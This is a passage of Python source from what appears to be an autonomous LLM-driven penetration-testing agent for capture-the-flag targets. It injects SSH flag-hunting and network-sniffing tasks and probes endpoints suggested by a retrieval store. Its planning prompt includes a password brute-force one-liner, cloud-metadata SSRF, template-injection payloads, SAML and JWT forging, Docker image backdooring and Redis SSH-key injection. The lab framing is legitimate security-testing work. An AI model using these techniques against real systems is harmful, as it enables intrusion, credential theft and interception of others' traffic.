        _skipped_ids = {t.get("id", "") for t in tasks if t.get("status") == "skipped"}
        _changed = True
        while _changed:
            _changed = False
            for t in tasks:
                if t.get("status") != "pending":
                    continue
                _deps = t.get("dependent_task_ids", []) or t.get("dependencies", [])
                if not _deps:
                    continue
                if all(d in _skipped_ids for d in _deps):
                    t["status"] = "skipped"
                    _skipped_ids.add(t.get("id", ""))
                    _changed = True

        # ── Credential-aware hint: use discovered credentials ─────
        # When credentials were auto-extracted but no task uses them
        # to log in, inject one.  Cred_type-aware: SSH creds get
        # ssh_exec, AWS creds get aws_cli, others get the appropriate
        # client tool.  Without this, the plan review LLM often adds
        # credential-guessing tasks instead of using what we already have.
        if _resolved_user and _resolved_pass and tasks:
            # Determine the right tool based on cred_type
            _cred_tool = "ssh_exec"
            _cred_instruction = (
                f"SSH into {_resolved_host or self.target_host}:{_resolved_port or 22} "
                f"as {_resolved_user} using the discovered password. Immediately hunt "
                f"for flag: cat /flag* /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null; "
                f"find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null | head -10"
            )
            _cred_params: dict = {
                "host": _resolved_host or self.target_host,
                "port": _resolved_port or 22,
                "username": _resolved_user,
                "password": _resolved_pass,
                "command": (
                    "cat /flag* /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null; "
                    "find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null | head -10"
                ),
            }
            if _resolved_cred_type == "aws":
                _cred_tool = "aws_cli"
                _cred_instruction = (
                    f"Use discovered AWS credentials ({_resolved_user} / "
                    f"{_resolved_pass[:20]}...) to enumerate S3 buckets and "
                    f"retrieve objects. Try: aws_cli s3 ls --endpoint-url "
                    f"http://{_resolved_host or self.target_host}:{_resolved_port or 10704}"
                )
                _cred_params = {
                    "service": "s3",
                    "action": "ls",
                    "endpoint_url": (
                        f"http://{_resolved_host or self.target_host}"
                        f":{_resolved_port or 10704}"
                    ),
                }
            elif _resolved_cred_type in ("mysql", "postgres", "postgresql",
                                          "mssql", "redis", "oracle", "mongodb"):
                _cred_tool = "shell_exec"
                _cred_instruction = (
                    f"Use discovered {_resolved_cred_type} credentials "
                    f"({_resolved_user}:****@{_resolved_host or self.target_host}"
                    f":{_resolved_port}) to connect and enumerate the database "
                    f"for flags and sensitive data."
                )

            _has_login_task = any(
                str(t.get("tool", "")) == _cred_tool
                and str(t.get("params", {}).get("username", "")) == _resolved_user
                and t.get("status") == "pending"
                for t in tasks
            )
            if not _has_login_task:
                tasks.append({
                    "id": f"task-credential-{_resolved_cred_type or 'ssh'}",
                    "instruction": _cred_instruction,
                    "tool": _cred_tool,
                    "params": _cred_params,
                    "dependent_task_ids": [],
                    "status": "pending",
                    "source": "credential-hint",
                })

        # ── Session-aware hint: suggest network discovery ─────────
        # When SSH access was gained (Session nodes exist) but the plan
        # has no network recon tasks, inject a hint.  Shared-network
        # containers are common in Docker/K8S scenarios — sniffing the
        # bridge network can capture credentials, tokens, and flags.
        _sessions = self.dkg.query_nodes("Session")
        if _sessions and tasks:
            _has_net_task = any(
                str(t.get("tool", "")).lower() in (
                    "tcpdump_capture", "shell_exec",
                ) and any(
                    kw in str(t.get("instruction", "")).lower()
                    for kw in ("tcpdump", "ip addr", "netstat", "ss ", "arp",
                               "network", "sniff", "ngrep", "bridge")
                )
                for t in tasks
            )
            if not _has_net_task:
                # Pull host/user from Session, password from Credential
                _sess = _sessions[0]
                _sess_host = _sess.get("host", self.target_host)
                _sess_user = _sess.get("user", "")
                _sess_port = 22
                _sess_pass = _resolved_pass
                # Try to get port and password from credentials
                _creds = self.dkg.query_nodes("Credential")
                for _c in _creds:
                    if _c.get("username") == _sess_user or not _sess_user:
                        _sess_user = _sess_user or _c.get("username", "")
                        _sess_pass = _sess_pass or _c.get("password", "")
                        _cp = _c.get("port", 0)
                        if _cp:
                            _sess_port = int(_cp)
                        break
                _net_hint = (
                    "You have an active shell session. Before hunting for "
                    "flags locally, check the NETWORK — containers often "
                    "share a bridge network with other services. Run: "
                    "ip addr (discover interfaces/gateways), "
                    "ss -tlnp / netstat -tlnp (listening ports on other hosts), "
                    "and tcpdump_capture with filter='tcp port 5000 or tcp port 80' "
                    "(sniff HTTP traffic for tokens/credentials). "
                    "The flag may be in transit between containers, not on disk."
                )
                tasks.append({
                    "id": "task-net-discovery-hint",
                    "instruction": _net_hint,
                    "tool": "ssh_exec",
                    "params": {
                        "host": _sess_host,
                        "port": _sess_port,
                        "username": _sess_user or "root",
                        "password": _sess_pass,
                        "command": "ip addr && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
                    },
                    "dependent_task_ids": [],
                    "status": "pending",
                    "source": "session-hint",
                })

        # ── Post-generation: shell_exec → specialized tool correction ─
        # LLM often defaults to shell_exec for tasks that have dedicated
        # tools (aws_cli, curl_get, send_payload).  Detect these at the
        # code level and correct — this is more reliable than prompt fixes.
        for t in tasks:
            if t.get("tool") != "shell_exec" or t.get("status") not in (None, "", "pending"):
                continue
            _inst = str(t.get("instruction", "")).lower()
            _cmd = str(t.get("params", {}).get("command", "")).lower()
            _combined = f"{_inst} {_cmd}"

            # S3 / AWS operations → aws_cli or curl_get
            if any(kw in _combined for kw in ("s3 ", "s3:", "bucket", "list-buckets",
                                               "list-objects", "aws s3", "object storage")):
                t["tool"] = "curl_get"
                t["instruction"] = (
                    f"[auto-corrected: shell_exec->curl_get (S3/object storage)] "
                    f"{t.get('instruction', '')}"
                )
                if "command" in t.get("params", {}):
                    del t["params"]["command"]
                continue

            # AWS IAM / STS / credential operations → aws_cli
            if any(kw in _combined for kw in ("aws ", "iam ", "sts ", "lambda ",
                                               "accesskeyid", "secretaccesskey",
                                               "list-roles", "get-caller-identity",
                                               "assume-role", "aws cli")):
                t["tool"] = "aws_cli"
                t["instruction"] = (
                    f"[auto-corrected: shell_exec->aws_cli (AWS cloud operation)] "
                    f"{t.get('instruction', '')}"
                )
                if "command" in t.get("params", {}):
                    del t["params"]["command"]
                continue

            # curl-based HTTP operations → curl_get
            if _cmd.strip().startswith("curl ") and "aws " not in _cmd:
                t["tool"] = "curl_get"
                t["instruction"] = (
                    f"[auto-corrected: shell_exec->curl_get (curl in shell_exec)] "
                    f"{t.get('instruction', '')}"
                )
                if "command" in t.get("params", {}):
                    del t["params"]["command"]

    async def _generate_exploitation_plan(self, target_url: str, cteg_hints: dict | None = None) -> ExploitationPlan:
        """Generate a structured plan from bootstrap state (nmap results only).

        Called at the start of _unified_llm_loop(). The LLM receives bootstrap
        nmap data, all tools (recon + attack), and decides what to do first.
        """
        plan_id = f"plan-{int(time.time())}"
        plan = ExploitationPlan(
            plan_id=plan_id, phase="explore", goal=f"Capture flag on {target_url}",
            status="in_progress", created_at=time.strftime("%Y-%m-%dT%H:%M:%S"),
        )

        state = self._get_state()
        # All tools: recon + attack, since LLM drives everything.
        # Filter blacklisted tools so the LLM never generates plans using them.
        all_tools = sorted(set(
            self.attack_gateway.get_tool_names() +
            self.recon_gateway.get_tool_names()
        ))
        # Include MCP tools (nvd_search_cves, github code search, etc.)
        try:
            for t in self.mcp_pool.get_tool_names():
                if t not in all_tools:
                    all_tools.append(t)
        except Exception:
            pass
        all_tools = [t for t in all_tools if t not in self._BLACKLISTED_TOOLS]

        # Build a tool catalog with parameter schemas so the LLM generates
        # plans with correct parameter names (e.g. "host"+"port" not "target").
        _tool_catalog_parts = []
        _tdefs = list(self.attack_gateway.get_tool_definitions() +
                      self.recon_gateway.get_tool_definitions())
        # Include MCP tool definitions so the LLM knows correct parameters
        try:
            _tdefs += self.mcp_pool.get_tool_definitions()
        except Exception:
            pass
        for tdef in _tdefs:
            tname = tdef["function"]["name"]
            if tname in self._BLACKLISTED_TOOLS:
                continue
            params = tdef["function"].get("parameters", {})
            props = params.get("properties", {})
            required = params.get("required", [])
            param_strs = []
            for pname, pinfo in props.items():
                ptype = pinfo.get("type", "string")
                pdesc = (pinfo.get("description", "") or "")[:80]
                req = "required" if pname in required else "optional"
                param_strs.append(f"    {pname}: {ptype} ({req}) — {pdesc}")
            param_block = "\n".join(param_strs) if param_strs else "    (no parameters)"
            desc = (tdef["function"].get("description", "") or "")[:200]
            _tool_catalog_parts.append(f"### {tname}\n{desc}\nParameters:\n{param_block}")
        tool_catalog = "\n\n".join(_tool_catalog_parts)

        # Services context
        services_lines = []
        for s in state.services:
            if s.port:
                skip = " [skip]" if s.skip_exploit else ""
                services_lines.append(
                    f"  port {s.port}/{s.protocol}: {s.version or s.banner}{skip}"
                )

        # Phase summary from prior loops
        phase_summary = ""
        summaries = self.dkg.query_nodes("PlanSummary")
        if summaries:
            phase_summary = "\n## Previous Loop Summary\n"
            for s in summaries[-2:]:
                phase_summary += f"- {s.get('phase','')}: {s.get('key_findings','')[:300]}\n"

        # ── RAG knowledge injection ────────────────────────────────
        # Search RAG for attack patterns matching discovered services.
        # This gives the LLM concrete exploitation steps instead of
        # relying solely on technique names from the research phase.
        rag_context = ""
        probed_rag_endpoints: list[str] = []
        try:
            from darwin.rag import get_rag
            rag = get_rag()
            if rag and rag.loaded:
                # Build search query: service banners + app type + vuln types.
                # Service version alone (e.g. "Apache httpd 2.4.62") skews
                # results toward generic server exploits instead of the CMS
                # actually running on top.  Include application understanding
                # from the analyze phase (e.g. "WordPress 6.7.2").
                svc_terms = []
                for s in state.services[:3]:
                    if s.version:
                        # Keep just the server name, not the full version banner
                        ver = s.version.split("(")[0].strip()  # "Apache httpd 2.4.62"
                        svc_terms.append(ver[:40])
                    elif s.banner:
                        svc_terms.append(s.banner[:40])
                # Pull app-level context from analysis notes
                app_terms = []
                for note in state.analysis_notes:
                    # Extract CMS / framework names
                    for kw in ["WordPress", "Drupal", "Joomla", "Tomcat", "Jenkins",
                               "Django", "Laravel", "Rails", "PHP", "ASP.NET",
                               "Confluence", "GitLab", "Magento", "PrestaShop"]:
                        if kw.lower() in note.lower() and kw not in app_terms:
                            app_terms.append(kw)
                vuln_terms = list({v.vuln_type for v in self.vulnerabilities[:4]})
                query = " ".join(app_terms + svc_terms + vuln_terms)
                if query.strip():
                    # Two-pass search: (1) precise query, (2) broad app-level
                    # plugin/exploit search to catch what the precise query misses
                    results = rag.search(query, top_k=5, min_keyword_overlap=0.2)
                    if app_terms:
                        _app_str = " ".join(app_terms)
                        # Multiple query angles to catch different exploit
                        # patterns.  A single broad query ("plugin exploit")
                        # often misses entries that match specific technique
                        # descriptions (e.g. "unrestricted file upload").
                        _broad_queries = [
                            _app_str + " plugin exploit vulnerability",
                            _app_str + " unauthenticated file upload RCE",
                            _app_str + " arbitrary file upload vulnerability",
                            _app_str + " unrestricted file upload exploit",
                        ]
                        _broad_results: list[dict] = []
                        for _bq in _broad_queries:
                            try:
                                _br = rag.search(_bq, top_k=5, min_keyword_overlap=0.2)
                                _broad_results.extend(_br)
                            except Exception:
                                pass
                        # Merge: deduplicate by title, keep highest-score copy
                        seen_titles: set[str] = set()
                        merged: list[dict] = []
                        for r in results + _broad_results:
                            t = (r.get("title") or "").strip().lower()
                            if t and t not in seen_titles:
                                seen_titles.add(t)
                                merged.append(r)
                        merged.sort(key=lambda r: r.get("score", 0), reverse=True)
                        results = merged[:10]

                    # ── Cloud Platform Discovery enrichment ──────────
                    # When _cloud_discovery_hint() detected a cloud platform
                    # (AWS-compatible, K8s API), search RAG for privilege
                    # escalation and service discovery patterns beyond the
                    # initial service (S3 → IAM, STS, Lambda; K8s → RBAC).
                    _pd_vulns = [
                        v for v in self.dkg.query_nodes("Vulnerability")
                        if v.get("vuln_type") == "PlatformDiscovery"
                    ]
                    # Also detect cloud platforms from DKG Service nodes even if
                    # no PlatformDiscovery vuln was explicitly created. Cloud
                    # service banners (IMDS, S3, STS) are reliable signals.
                    if not _pd_vulns:
                        _cloud_svc_sigs = any(
                            cs in str(s).lower()
                            for cs in ("imds", "ec2 metadata", "s3-compatible",
                                       "aws sts", "lambda", "amazon ec2")
                            for s in self.dkg.query_nodes("Service")
                        )
                        if _cloud_svc_sigs:
                            _pd_vulns = [{"evidence": "cloud-service-banner-detected"}]
                    if _pd_vulns:
                        _pd_evidence = (_pd_vulns[0].get("evidence", "") or "").lower()
                        _platform_queries: list[str] = []
                        if "aws" in _pd_evidence or "s3" in _pd_evidence or "cloud-service" in _pd_evidence:
                            _platform_queries = [
                                "AWS IAM privilege escalation enumeration techniques",
                                "AWS cloud service discovery STS Lambda after S3 access",
                            ]
                        elif "kubernetes" in _pd_evidence or "k8s" in _pd_evidence:
                            _platform_queries = [
                                "Kubernetes RBAC enumeration privilege escalation",
                                "K8s API resource discovery after initial access",
                            ]
                        else:
                            # Generic cloud platform — search broadly
                            _platform_queries = [
                                "cloud platform service enumeration privilege escalation",
                            ]
                        _cloud_merged: list[dict] = []
                        _cloud_seen: set[str] = set()
                        for _pq in _platform_queries:
                            try:
                                _cr = rag.search(_pq, top_k=4, min_keyword_overlap=0.1)
                                for _r in _cr:
                                    _rt = (_r.get("title") or "").strip().lower()
                                    if _rt and _rt not in _cloud_seen:
                                        _cloud_seen.add(_rt)
                                        _cloud_merged.append(_r)
                            except Exception:
                                pass
                        if _cloud_merged:
                            # Merge cloud results with existing RAG results:
                            # cloud-specific knowledge about privilege
                            # escalation and multi-service exploration
                            # should appear alongside service-specific
                            # exploitation techniques.
                            _existing_titles = {
                                (r.get("title") or "").strip().lower()
                                for r in results
                            }
                            for _cr in _cloud_merged:
                                _crt = (_cr.get("title") or "").strip().lower()
                                if _crt and _crt not in _existing_titles:
                                    results.append(_cr)
                                    _existing_titles.add(_crt)
                            log.info(
                                "Cloud Platform RAG: %d results for platform %s",
                                len(_cloud_merged),
                                "AWS" if "aws" in _pd_evidence else
                                "K8s" if "kubernetes" in _pd_evidence else "generic",
                            )

                    if results:
                        # ── Probe RAG-suggested endpoints ─────────────────
                        # RAG technique entries often contain concrete paths
                        # (e.g. POST /wp-content/plugins/x/ee-upload-engine.php).
                        # Probe them proactively — if the endpoint exists,
                        # the LLM can plan exploitation directly.
                        _probe_paths: set[str] = set()
                        _path_re = re.compile(
                            r'(?:GET|POST|PUT|DELETE)\s+(/\S+)',
                            re.IGNORECASE,
                        )
                        _known_urls = {e.get("url", "") for e in self.dkg.query_nodes("Endpoint")}
                        # Derive the real HTTP base from discovered endpoints,
                        # not from target_url (which may lack a port, e.g.
                        # "http://localhost" vs the real "http://localhost:10103").
                        _base = target_url.rstrip("/")
                        _http_eps = [e.get("url", "") for e in self.dkg.query_nodes("Endpoint")
                                     if e.get("url", "").startswith("http")]
                        if _http_eps:
                            from urllib.parse import urlparse as _up
                            _parsed = _up(_http_eps[0])
                            _base = f"{_parsed.scheme}://{_parsed.netloc}"
                        for r in results:
                            for tech in r.get("techniques", []) or []:
                                for m in _path_re.finditer(str(tech)):
                                    path = m.group(1)
                                    # Skip placeholders like /{{path}} or /{{endpoint}}
                                    if "{{" in path or "}}" in path:
                                        continue
                                    if path not in _probe_paths:
                                        _probe_paths.add(path)

                        # Collect session cookies for authenticated probing
                        _cookies = ""
                        if self.client._session and self.client._session.cookie_jar:
                            jar = list(self.client._session.cookie_jar)
                            if jar:
                                _cookies = "; ".join(f"{c.key}={c.value}" for c in jar)

                        _probed: list[dict] = []
                        for path in list(_probe_paths)[:8]:
                            ep_url = f"{_base}{path}"
                            if ep_url in _known_urls:
                                continue
                            _known_urls.add(ep_url)
                            try:
                                curl_args: dict = {
                                    "url": ep_url, "follow_redirects": True,
                                    "insecure": True if "https" in _base else False,
                                }
                                if _cookies:
                                    curl_args["headers"] = f"Cookie: {_cookies}"
                                rp = await self.recon_gateway.call("curl_get", curl_args)
                                if rp.success:
                                    out = getattr(rp, "stdout", "") or ""
                                    st = 200
                                    fl = (out or "").split("\n")[0] if out else ""
                                    if fl.startswith("HTTP/"):
                                        pts = fl.split()
                                        if len(pts) >= 2 and pts[1].isdigit():
                                            st = int(pts[1])
                                    # 405 Method Not Allowed means the endpoint exists
                                    # but doesn't accept GET (likely POST-only)
                                    _probed.append({
                                        "url": ep_url, "status": st,
                                        "size": len(out),
                                    })
                            except Exception:
                                pass

                        if _probed:
                            # Endpoint exists if status is not 404 (includes 200, 403,
                            # 405, 500 — all indicate something is there).
                            _found = [p for p in _probed if p["status"] not in (404, 0)]
                            for p in _found:
                                label = p["url"].replace(_base, "").replace("/", "-")[:50]
                                self.dkg.add_node("Endpoint", f"ep-rag-{label}", {
                                    "url": p["url"], "method": "GET", "params": "",
                                    "sample_status": p["status"],
                                    "sample_response": f"HTTP {p['status']} ({p['size']} bytes)",
                                    "discovered_by": "rag-endpoint-probe",
                                })
                            # Build a concise summary for the plan prompt
                            _probed_lines = [
                                f"- {p['url']} → HTTP {p['status']} ({p['size']} bytes)"
                                for p in _probed[:8]
                            ]
                            probed_rag_endpoints = _probed_lines
                            log.info("RAG endpoint probe: %d/%d paths exist on target",
                                     len(_found), len(_probed))

                        lines = ["\n## Attack Pattern Knowledge (from RAG)\n"]
                        for r in results[:4]:
                            title = r.get("title", "") or ""
                            desc = (r.get("description", "") or "")
                            techniques = r.get("techniques", []) or []
                            tech_str = (" Techniques: " + "; ".join(str(t) for t in techniques[:3])) if techniques else ""
                            snippet = (desc[:250] + "...") if len(desc) > 250 else desc
                            lines.append(f"- **{title}**: {snippet}{tech_str}")
                            lines.append("")
                        lines.append("**CRITICAL: RAG results above contain proven attack techniques "
                                     "and credential combinations for the detected services. "
                                     "When the service name/type matches your target, the techniques "
                                     "and specific credentials listed MUST be used in your tasks. "
                                     "Only discard entries whose software/service type clearly does "
                                     "not match the target (e.g., MySQL techniques for a PostgreSQL target).")

                        # Extract concrete payload patterns from RAG results
                        _rag_payloads: list[str] = []
                        for r in results[:4]:
                            for tech in (r.get("techniques", []) or []):
                                tech_str = str(tech)
                                # Match payload-like patterns: ${...}, Fn::..., {{...}}
                                if (_re.search(r'\$\{[^}]+\}', tech_str)
                                        or 'Fn::' in tech_str
                                        or '{{' in tech_str):
                                    _rag_payloads.append(tech_str[:200])
                            # Also check description for payload patterns
                            desc = r.get("description", "") or ""
                            if _re.search(r'\$\{[^}]+\}', desc):
                                _rag_payloads.append(desc[:200])
                        if _rag_payloads:
                            _deduped = list(dict.fromkeys(_rag_payloads))  # preserve order, remove dups
                            lines.append("")
                            lines.append("**Extracted Payloads (use verbatim in tasks):**")
                            for _p in _deduped[:5]:
                                lines.append(f"  - `{_p}`")

                        rag_context = "\n".join(lines)
        except Exception:
            pass

        # If RAG returned nothing, provide a clear fallback so the prompt
        # doesn't have a blank "Attack Pattern Knowledge" section.
        if not rag_context:
            rag_context = ("\n## Attack Pattern Knowledge\n"
                           "No stored attack patterns matched the target's "
                           "technology stack. Use general exploitation knowledge "
                           "and web search for technique guidance.\n")

        # ── Artifact → Tool Bridge ──────────────────────────────────
        # Scan DKG for discovered artifacts (AWS credentials, private
        # keys, cloud endpoints) and build explicit tool-to-artifact
        # recommendations.  Without this structural bridge the LLM
        # often fails to connect "found a private key" → "call
        # saml_forge", or "STS endpoint" → "call aws_sts_query".
        _artifact_lines: list[str] = []
        _artifact_seen: set[str] = set()  # deduplicate by category
        # (a) Credential nodes — check for cloud cred types
        for cred in self.dkg.query_nodes("Credential"):
            ct = str(cred.get("cred_type", "")).lower()
            cuser = str(cred.get("username", "") or "")
            cpass = str(cred.get("password", "") or "")
            if ("aws" in ct or "iam" in ct) and "aws_creds" not in _artifact_seen:
                _artifact_lines.append(
                    "- **AWS credentials discovered** ("
                    + (f"user={cuser}, " if cuser else "")
                    + f"type={ct}): use `aws_cli` with `--endpoint-url` or "
                    + "`aws_sts_query` to enumerate roles; "
                    + "`aws_iam_federation` for assume-role")
                _artifact_seen.add("aws_creds")
            if "private_key" in ct and "private_key" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Private key / PEM discovered**: use `saml_forge` to "
                    + "build a SAML assertion, then `aws_cli` action=assume-role-with-saml "
                    + "or `aws_iam_federation`")
                _artifact_seen.add("private_key")
            if ("token" in ct or "jwt" in ct or "bearer" in ct) and "token" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Token / JWT discovered**: use `jwt_forge` to craft a "
                    + "custom claim, then `aws_iam_federation` action=assume-role-with-web-identity")
                _artifact_seen.add("token")
        # (b) Endpoint nodes — check banners for cloud service signatures
        for ep in self.dkg.query_nodes("Endpoint"):
            banner = str(ep.get("banner", "") or ep.get("sample_response", "") or "").lower()
            url = str(ep.get("url", "") or "").lower()
            _ep_sig = f"{banner} {url}"
            if ("s3" in _ep_sig or "object" in banner or "bucket" in banner) and "s3_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Object-storage / S3 endpoint detected**: use "
                    + "`object_store_get` to enumerate and retrieve objects")
                _artifact_seen.add("s3_endpoint")
            if ("oidc" in _ep_sig or "openid" in _ep_sig) and "oidc_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **OIDC IdP endpoint detected**: use `jwt_forge` with "
                    + "wildcard/malformed claims, then `aws_iam_federation` "
                    + "action=assume-role-with-web-identity")
                _artifact_seen.add("oidc_endpoint")
            if ("saml" in _ep_sig or "federation" in _ep_sig) and "saml_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **SAML federation endpoint detected**: use `saml_forge` "
                    + "to craft assertion, then `aws_iam_federation` "
                    + "action=assume-role-with-saml")
                _artifact_seen.add("saml_endpoint")
            if "sts" in _ep_sig and "sts_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **STS endpoint detected**: use `aws_sts_query` for "
                    + "direct Query API calls (no AWS CLI needed). If SCP "
                    + "blocks access, try `api_version=2010-05-08` (pre-SCP legacy)")
                _artifact_seen.add("sts_endpoint")
            if ("docker-distribution" in _ep_sig or "docker registry" in _ep_sig
                    or "registry/2.0" in _ep_sig or "/v2/" in _ep_sig
                    or "docker-registry" in _ep_sig) and "docker_registry" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Docker Registry v2 API detected**: use `docker_registry` "
                    + "to pull, modify (backdoor), and push images. Then use "
                    + "`kubectl_get_pods` + `kubectl_exec` to trigger pod restart "
                    + "and read flag from the compromised container.")
                _artifact_seen.add("docker_registry")
        # (c) Analysis / Vulnerability nodes — check for PEM keys in evidence
        for an in self.dkg.query_nodes("Analysis"):
            ev = str(an.get("evidence", "") or an.get("summary", "") or an.get("findings", "") or "")
            if "-----BEGIN" in ev and "pem_key" not in _artifact_seen:
                _artifact_lines.append(
                    "- **PEM/private key found in analysis output**: use "
                    + "`saml_forge` to build SAML assertion, then "
                    + "`aws_cli` action=assume-role-with-saml")
                _artifact_seen.add("pem_key")
                break
        # (d) Vulnerability nodes — type-based hints
        for vn in self.dkg.query_nodes("Vulnerability"):
            vt = str(vn.get("vuln_type", "") or "").lower()
            if "ssrf" in vt and "ssrf_hint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **SSRF vulnerability confirmed**: probe internal "
                    + "services (IMDS 169.254.169.254, localhost, Docker "
                    + "bridge). If credentials are returned, feed them to "
                    + "`aws_cli` / `object_store_get` / `aws_sts_query`")
                _artifact_seen.add("ssrf_hint")
            if ("cloudformation" in vt or "template" in vt) and "cf_hint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **CloudFormation / template injection**: test "
                    + "Fn::Sub payloads like `${/secure/flag}` or "
                    + "`{{resolve:ssm:/secure/flag}}` via `send_payload`")
                _artifact_seen.add("cf_hint")

        _artifact_bridge = ""
        if _artifact_lines:
            _artifact_bridge = (
                "\n## Discovered Artifacts → Recommended Tools\n"
                + "\n".join(_artifact_lines) + "\n"
                + "**CRITICAL: These tool mappings are derived from artifacts "
                + "you have ALREADY discovered.  Use them in your plan tasks.**\n"
            )
            log.info("[ARTIFACT-BRIDGE] %d recommendations: %s",
                     len(_artifact_lines), ", ".join(sorted(_artifact_seen)))

        prompt = f"""Target: {target_url}

## Discovered Services (from nmap)
{chr(10).join(services_lines) if services_lines else '(none)'}

## Current State
- {len(state.endpoints)} endpoints discovered so far
- {len(state.services)} services detected
- Credentials: {len(state.credentials)} known
{phase_summary}
## Analyzed Vulnerabilities
{self._format_vulnerability_summary()}
{rag_context}
{_artifact_bridge}
{self._build_defense_evasion_context()}
## Synthesizing Knowledge into Attack Tasks
You have received multiple intelligence sources above:
- Vulnerability hypotheses from the analysis phase
- Attack pattern knowledge (if RAG results matched your target's technology stack)
- Service version information from reconnaissance

Your job: COMBINE these sources when designing each task.
**CRITICAL — Unfamiliar Services/Technologies:** If you are not 100% certain how to exploit a
discovered service or technology, call `knowledge_search` tool FIRST with an empty category
to search the knowledge base for concrete exploitation techniques before writing tasks for it.
Do NOT assume — services like Oracle TNS, CouchDB, Elasticsearch, Redis, and MongoDB each
have protocol-specific exploitation methods that differ from generic HTTP exploitation.
**CRITICAL for WeakAuth/default credentials:** When RAG results contain specific credential
combinations (username:password pairs), you MUST include EVERY listed combination in your
batch credential test. Do NOT rely on your own memory of "common passwords" — the RAG
entries are the authoritative source for service-specific defaults.
- When an attack pattern matches a discovered service: use the pattern's technique as the task's approach. The RAG result title and techniques field tell you exactly what to do.
- **Payload injection**: If a vulnerability lists "Payloads:" in its summary or the Attack Pattern Knowledge section contains "Extracted Payloads", those are proven exploitation strings validated against the target's technology. Include them verbatim in the corresponding task's params["data"] or params["payload"]. Do NOT modify or truncate them.
- When patterns do NOT match: rely on general vulnerability exploitation principles for that vulnerability type.
- Service versions are primary signals: an outdated service with known weaknesses should generate high-priority exploitation tasks targeting those specific weaknesses.
- If the analyze phase produced attack_paths, translate each path into a chain of tasks with dependent_task_ids reflecting the path's step ordering. A 4-step path becomes 4 tasks where each depends on the previous one.
- Tasks targeting DIFFERENT services or vulnerabilities with no shared prerequisites should have empty dependent_task_ids so they can execute in parallel.

## Available Tools (all recon + attack)
{', '.join(all_tools)}

{chr(10).join(['## RAG-Endpoint Probe Results (verified — these ENDPOINTS EXIST on the target):'] + probed_rag_endpoints) if probed_rag_endpoints else ''}

## Task
Generate a plan as a JSON array of EXPLOIT tasks. Reconnaissance and research
have already been completed. Each task should test or exploit a vulnerability:
- id: unique string (e.g. "task-1")
- dependent_task_ids: list of task IDs that must complete first
- instruction: what to exploit and how
- tool: exact exploit tool name (sqlmap_test, command_injection_test, etc.)
- params: tool parameters dict
- reason: which vulnerability this targets

**CRITICAL: Generate at most 15 tasks.** Include diverse attack strategies
(SQLi, XSS, CMDi, LFI, file upload, auth bypass, etc.) even for medium-confidence
vulnerabilities. The system can handle many parallel tasks.

**For WeakAuth / default credential vulnerabilities:** Do NOT create individual tasks
for each credential pair — this wastes iterations. Create a SINGLE shell_exec task
that uses a Python one-liner to batch-test ALL credential combinations at once.
Example for PostgreSQL:
```json
{{"id": "task-cred-batch", "dependent_task_ids": [],
 "instruction": "Batch-test all PostgreSQL credential combinations in ONE shell_exec call. Use Python subprocess with PGPASSWORD env var. Test common combos: (postgres,postgres), (postgres,''), (postgres,password), (postgres,admin), (postgres,password123), (postgres,postgresql). Print SUCCESS: for any working pair.",
 "tool": "shell_exec", "params": {{"command": "python3 -c \"import subprocess,os; combos=[('postgres','postgres'),('postgres',''),('postgres','password'),('postgres','admin'),('postgres','password123')]; [print(f'SUCCESS: {{u}}:{{p}}') if subprocess.run(['psql','-h','HOST','-p','PORT','-U',u,'-w','-c','SELECT 1'],env={{**os.environ,'PGPASSWORD':p}},capture_output=True).returncode==0 else None for u,p in combos]\""}}}}
```
This reduces 10+ sequential LLM roundtrips to 1 single tool execution.
Then add tasks for authenticated enumeration and data extraction depending on task-cred-batch.

## Dependency Rules (use dependent_task_ids to build a DAG)
Create meaningful task dependencies when:
1. **Credential-first**: tasks that use credentials (e.g. ssh, login) MUST depend
   on credential discovery/verification tasks.
2. **Foothold-first**: lateral movement tasks MUST depend on initial compromise.
3. **Parameter confirmation**: exploit tasks targeting a specific parameter SHOULD
   depend on tasks that confirm that parameter is injectable.
4. **Independent tasks**: exploit tasks targeting DIFFERENT endpoints/services with
   no shared prerequisites SHOULD have empty dependent_task_ids (run in parallel).

Example DAG for a target with SQLi + CMDi + SSH pivot:
```json
[
  {{"id": "task-1", "dependent_task_ids": [],
   "instruction": "Test SQLi on login endpoint", "tool": "sqlmap_test", ...}},
  {{"id": "task-2", "dependent_task_ids": [],
   "instruction": "Test CMDi on upload endpoint", "tool": "command_injection_test", ...}},
  {{"id": "task-3", "dependent_task_ids": ["task-1", "task-2"],
   "instruction": "Use obtained credentials for SSH pivot",
   "tool": "ssh_execute", ...}}
]
```
task-1 and task-2 run first (parallel, independent). task-3 waits for both.

## Strategy
1. CRITICAL: Create at least one EXPLOITATION task for EVERY vulnerability.
   Recon-only tasks (INFO, KEYS *, CONFIG GET) are NOT sufficient — you MUST
   include the actual exploit steps: CONFIG SET, SET key, SAVE, ssh_exec, etc.
   A plan with only recon tasks will FAIL.
2. Simple exploits needing one tool call (SQLi, XSS, CMDi) need 1 task. Complex
   multi-step exploits (SSH key injection via Redis CONFIG SET→dbfilename→
   SET→SAVE, container escape via check_caps→mount→release_agent, multi-stage
   lateral movement) require a SEPARATE task for EACH atomic step.
   dependencies. Consult the Research/CVEs fields above for technique guidance.
2. Prioritize high-confidence vulnerabilities first.
3. If an exploit succeeds or reveals new information, the plan will be
   updated after each task — new tasks can be added in replanning.
4. Do NOT add curl_get/http_post probing tasks — services have already been
   probed during reconnaissance.
5. **Flag location strategy**: After gaining RCE, try simple flag paths FIRST
   (/flag.txt, /flag, /root/flag.txt, /home/*/flag.txt) before launching
   complex recursive find/grep searches. Simple cat commands are faster and
   avoid timeouts.
6. If a vulnerability's suggested tool is curl_get (for LFI/IDOR/SSRF), use
   curl_get with the exact URL and parameter.

Output ONLY valid JSON array (3-20 tasks depending on complexity. More tasks != better — prefer focused, high-impact exploitation tasks over exhaustive probing)."""

